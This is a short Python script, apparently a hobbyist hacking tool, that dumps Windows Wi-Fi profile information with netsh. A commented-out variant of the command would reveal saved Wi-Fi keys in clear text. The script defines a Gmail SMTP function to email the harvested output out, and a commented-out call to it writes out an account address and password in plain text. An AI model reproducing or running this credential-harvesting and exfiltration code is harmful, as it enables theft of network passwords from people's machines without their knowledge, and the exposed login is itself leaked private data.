import subprocess as s
import smtplib
import time
import os
def nitish_email(email,password,message):
      srv = smtplib.SMTP('smtp.gmail.com', 587)
      srv.starttls()
      srv.login(email,password)
      srv.sendmail(email,email,message)
      srv.quit()
      
#cmd = ("netsh wlan show profiles * key = clear")
cmd = ("netsh wlan show all")
out = s.check_output(cmd, shell = True)
#print (b,out)
file=[]
for i in range (len(out)):
      print(chr(out[i]), end="")
      file.append(chr(out[i]))
      time.sleep(0.001)
" ".join(file)
#print(file)
#nitish_email("hacktheworld378@gmail.com","7004969879nitish",out)
os.system ("start explorer C:\\Users\\Nitish sharma\\Desktop\\Tool_hacking.py")

